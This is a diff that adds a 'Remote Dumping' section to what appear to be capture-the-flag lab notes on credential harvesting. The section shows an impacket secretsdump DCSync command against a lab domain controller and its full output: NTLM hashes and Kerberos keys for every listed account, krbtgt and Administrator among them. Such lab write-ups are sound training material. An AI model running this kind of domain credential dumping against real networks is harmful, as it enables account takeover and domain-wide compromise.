@@ -218,3 +218,61 @@ Candidates.#1....: R679FUKU -> Passp0rt
 Started: Thu Nov 10 02:29:36 2022
 Stopped: Thu Nov 10 02:30:08 2022
 ```
+
+## Remote Dumping (With Credentials)
+
+```text
+$ python3 /opt/impacket/examples/secretsdump.py -just-dc THM.red/thm@10.10.214.38
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
+thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
+thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
+thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
+thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
+thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
+thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
+sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
+CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
+Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
+Administrator:des-cbc-md5:6d34e608f8574632
+krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
+krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
+krbtgt:des-cbc-md5:d92ffd4abf02b049
+thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
+thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
+thm.red\thm:des-cbc-md5:794f3889e646e383
+thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
+thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
+thm.red\victim:des-cbc-md5:457cdc673d3b0d85
+thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
+thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
+thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
+thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
+thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
+thm.red\admin:des-cbc-md5:32a8a201d3080b2f
+thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
+thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
+thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
+thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
+thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
+thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
+thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
+thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
+thm.red\test-user:des-cbc-md5:aec8e3325b85316b
+sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
+sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
+sshd:des-cbc-md5:b58f850b4c082cc7
+CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:508aa735622e15c3fdd0a12f52ce779fa382205b828bdc0f441ddfeaef1bbf13
+CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:db9e72cb40e0f8b93a7f44e7f79669fc
+CREDS-HARVESTIN$:des-cbc-md5:f434a7298562ec6e
+[*] Cleaning up... 
+```
